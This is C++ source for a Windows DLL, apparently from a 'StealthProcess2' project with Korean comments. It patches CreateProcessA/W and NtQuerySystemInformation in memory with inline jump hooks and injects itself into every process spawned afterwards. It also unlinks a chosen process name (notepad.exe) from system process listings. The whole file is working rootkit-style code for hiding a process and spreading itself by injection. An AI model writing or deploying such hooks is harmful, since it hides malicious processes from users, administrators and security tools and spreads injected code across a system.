// dllmain.cpp : DLL 애플리케이션의 진입점을 정의합니다.
#include "pch.h"

#pragma comment(linker, "/SESCTION:.SHARE,RWS")
#pragma data_seg(".SHARE")
TCHAR hideProcName[MAX_PATH] = L"notepad.exe";
#pragma data_seg()

#define JMP_BUFFER		6
#define HOOKING_BUFFER	14 //JMP_BUFFER + DWORD64
#define SYSTEM_PROCESS_INFORMATION		0x05
#define STATUS_SEVERITY_SUCCESS			0x0

typedef BYTE	SYSTEM_INFORMATION_CLASS;

//함수모음
void ErrorMessage(const char* msg);
void Hooking(const char* dllName, const char* procName, const BYTE* buffer, const int bufferSize, BYTE* oriBuffer = NULL);
BOOL NewCreateProcessA(LPCSTR appName, LPSTR cmdLine, LPSECURITY_ATTRIBUTES procAttributes, LPSECURITY_ATTRIBUTES threadAttributes, BOOL inHeritHandle, DWORD flags, LPVOID env, LPCSTR currentDir, LPSTARTUPINFOA startupInfo, LPPROCESS_INFORMATION procInfo);
BOOL WINAPI NewCreateProcessW(_In_opt_ LPCWSTR appName, _Inout_opt_ LPWSTR cmdLine, _In_opt_ LPSECURITY_ATTRIBUTES procAttributes, _In_opt_ LPSECURITY_ATTRIBUTES threadAttributes, _In_ BOOL inHeritHandle, _In_ DWORD flags, _In_opt_ LPVOID env, _In_opt_ LPCWSTR currentDir, _In_ LPSTARTUPINFOW startupInfo, _Out_ LPPROCESS_INFORMATION procInfo);
NTSTATUS NewQuerySystemInformation(_In_ SYSTEM_INFORMATION_CLASS sysInfoClass, _In_ _Out_ void* sysInfo, _In_ ULONG sysInfoLen, _Out_ ULONG* retLen);

//포인터함수 모음
typedef BOOL(WINAPI* procA)(LPCSTR appName, LPSTR cmdLine, LPSECURITY_ATTRIBUTES procAttributes, LPSECURITY_ATTRIBUTES threadAttributes, BOOL inHeritHandle, DWORD flags, LPVOID env, LPCSTR currentDir, LPSTARTUPINFOA startupInfo, LPPROCESS_INFORMATION procInfo);
typedef BOOL(WINAPI* procW)(_In_opt_ LPCWSTR appName, _Inout_opt_ LPWSTR cmdLine, _In_opt_ LPSECURITY_ATTRIBUTES procAttributes, _In_opt_ LPSECURITY_ATTRIBUTES threadAttributes, _In_ BOOL inHeritHandle, _In_ DWORD flags, _In_opt_ LPVOID env, _In_opt_ LPCWSTR currentDir, _In_ LPSTARTUPINFOW startupInfo, _Out_ LPPROCESS_INFORMATION procInfo);
typedef NTSTATUS(*pNtQuerySystemInforatmion)(_In_  SYSTEM_INFORMATION_CLASS sysInfoClass, _In_ _Out_ void* sysInfo, _In_ ULONG sysInfoLen, _Out_ ULONG* retLen);

//전역 변수 & 상수
TCHAR* DLL_PATH = (TCHAR*)L"D:\\Source\\StealthProcess2\\StealthProcess2.dll";
const char* dllName = NULL;
const char* procName = NULL;
DWORD64 procAddr = NULL;
const BYTE jmpCode[JMP_BUFFER] = { 0xff, 0x25, 0, };
BYTE originBuffer[HOOKING_BUFFER] = { 0, };
BYTE hookingCode[HOOKING_BUFFER] = { 0, };
INJECTOR* ijt = nullptr;


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
	HANDLE token = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &token)) ErrorMessage("OpenProcessToken");
	privilege pv(token);
	if (!pv.SetPrivilege(SE_DEBUG_NAME, TRUE)) ErrorMessage("SetPrivilege");

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		
		dllName = "kernelbase";
		procName = "CreateProcessA";
		procAddr = (DWORD64)NewCreateProcessA;

        memcpy_s(hookingCode, JMP_BUFFER, jmpCode, JMP_BUFFER);
        memcpy_s(&hookingCode[JMP_BUFFER], sizeof(DWORD64), &procAddr, sizeof(DWORD64));
		Hooking(dllName, procName, hookingCode, HOOKING_BUFFER, originBuffer);

		procName = "CreateProcessW";
		procAddr = (DWORD64)NewCreateProcessW;

		memset(hookingCode, 0, sizeof(hookingCode));
		memcpy_s(hookingCode, JMP_BUFFER, jmpCode, JMP_BUFFER);
		memcpy_s(&hookingCode[JMP_BUFFER], sizeof(DWORD64), &procAddr, sizeof(DWORD64));
		Hooking(dllName, procName, hookingCode, HOOKING_BUFFER, originBuffer);

		dllName = "ntdll.dll";
		procName = "NtQuerySystemInformation";
		procAddr = (DWORD64)NewQuerySystemInformation;

		memset(hookingCode, 0, sizeof(hookingCode));
		memcpy_s(hookingCode, JMP_BUFFER, jmpCode, JMP_BUFFER);
		memcpy_s(&hookingCode[JMP_BUFFER], sizeof(DWORD64), &procAddr, sizeof(DWORD64));
		Hooking(dllName, procName, hookingCode, HOOKING_BUFFER, originBuffer);

		break;

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

void ErrorMessage(const char* msg) {
	MessageBoxA(NULL, msg, "ERROR", NULL);
	exit(1);
};


void Hooking(const char* dllName, const char* procName, const BYTE* buffer, const int bufferSize, BYTE* oriBuffer) {
	HMODULE oriDll = NULL;
	void* oriFunc = NULL;
	DWORD oldProtect = 0;

	oriDll = GetModuleHandleA(dllName);
	if (oriDll == NULL) ErrorMessage("oriDll");

	oriFunc = GetProcAddress(oriDll, procName);
	if (oriFunc == NULL) ErrorMessage("oriFunc");


	if (!VirtualProtect(oriFunc, bufferSize, PAGE_EXECUTE_READWRITE, &oldProtect)) ErrorMessage("VirtualProtect");

	if (oriBuffer != NULL) memcpy_s(oriBuffer, bufferSize, oriFunc, bufferSize);
	memcpy_s(oriFunc, bufferSize, buffer, bufferSize);

	if (!VirtualProtect(oriFunc, bufferSize, oldProtect, &oldProtect));
};

BOOL NewCreateProcessA(LPCSTR appName, LPSTR cmdLine, LPSECURITY_ATTRIBUTES procAttributes, LPSECURITY_ATTRIBUTES threadAttributes, BOOL inHeritHandle, DWORD flags, LPVOID env, LPCSTR currentDir, LPSTARTUPINFOA startupInfo, LPPROCESS_INFORMATION procInfo) {
	Hooking(dllName, procName, originBuffer, HOOKING_BUFFER);
	auto result = CreateProcessA(appName, cmdLine, procAttributes, threadAttributes, inHeritHandle, flags, env, currentDir, startupInfo, procInfo);
	Hooking(dllName, procName, hookingCode, HOOKING_BUFFER);

	if (!result) return FALSE;
	   
	ijt = new INJECTOR(procInfo->dwProcessId);
	if (ijt == nullptr) ErrorMessage("Injector");

	ijt->SetDLLPath(DLL_PATH);
	ijt->Injection();

	return TRUE;
};

BOOL WINAPI NewCreateProcessW(_In_opt_ LPCWSTR appName, _Inout_opt_ LPWSTR cmdLine, _In_opt_ LPSECURITY_ATTRIBUTES procAttributes, _In_opt_ LPSECURITY_ATTRIBUTES threadAttributes, _In_ BOOL inHeritHandle, _In_ DWORD flags, _In_opt_ LPVOID env, _In_opt_ LPCWSTR currentDir, _In_ LPSTARTUPINFOW startupInfo, _Out_ LPPROCESS_INFORMATION procInfo) {
	
	Hooking(dllName, procName, originBuffer, HOOKING_BUFFER);
	auto result = CreateProcessW(appName, cmdLine, procAttributes, threadAttributes, inHeritHandle, flags, env, currentDir, startupInfo, procInfo);
	Hooking(dllName, procName, hookingCode, HOOKING_BUFFER);

	if (!result) return FALSE;

	ijt = new INJECTOR(procInfo->dwProcessId);
	if (ijt == nullptr) ErrorMessage("Injector");

	ijt->SetDLLPath(DLL_PATH);
	ijt->Injection();

	return TRUE;
};

NTSTATUS NewQuerySystemInformation(_In_ SYSTEM_INFORMATION_CLASS sysInfoClass, _In_ _Out_ void* sysInfo, _In_ ULONG sysInfoLen, _Out_ ULONG* retLen) {

	//MessageBoxA(NULL, "Check Function Call", "NewQsi", NULL);
	typedef struct _SYSTEM_PROCESS_INFORMATION {
		ULONG NextEntryOffset;
		ULONG NumberOfThreads;
		BYTE Reserved1[48];
		PVOID Reserved2[3];
		HANDLE UniqueProcessID;
		PVOID Reserved3;
		ULONG HandleCount;
		BYTE Reserved4[4];
		PVOID Reserved5[11];
		SIZE_T PeekPagefileUsage;
		SIZE_T PrivatePageCount;
		LARGE_INTEGER Reserved6[6];
	}SystemProcessInforMation, * PSystemPrcoessInforMation;

	NTSTATUS status;
	FARPROC pFunc;
	PSystemPrcoessInforMation pCur = NULL, pPrev = NULL;
	void* oriNtQuerySystemInformation = NULL;
	int result;

	Hooking(dllName, procName, originBuffer, HOOKING_BUFFER);

	oriNtQuerySystemInformation = GetProcAddress(GetModuleHandleA(dllName), procName);
	if (oriNtQuerySystemInformation == NULL) ErrorMessage("oriNtQuerySystemInformation");
	status = ((pNtQuerySystemInforatmion)oriNtQuerySystemInformation) (sysInfoClass, sysInfo, sysInfoLen, retLen);
	if (status != STATUS_SEVERITY_SUCCESS) goto __NEWQSI_END;

	if (sysInfoClass == SYSTEM_PROCESS_INFORMATION) {
		pCur = (PSystemPrcoessInforMation)sysInfo;

		while (TRUE) {
			if (pCur->Reserved2[1] != NULL) {
				result = _wcsicmp((PWSTR)(pCur->Reserved2[1]), hideProcName);
				if (result == 0) {
					if (pCur->NextEntryOffset == 0)
						pPrev->NextEntryOffset = 0;
					else
						pPrev->NextEntryOffset += pCur->NextEntryOffset;
				}
				else
					pPrev = pCur;
			};
			if (pCur->NextEntryOffset == 0)
				break;

			pCur = (PSystemPrcoessInforMation)((ULONG64)pCur + pCur->NextEntryOffset);
		};
	};

__NEWQSI_END:
	Hooking(dllName, procName, hookingCode, HOOKING_BUFFER);
	return status;
};
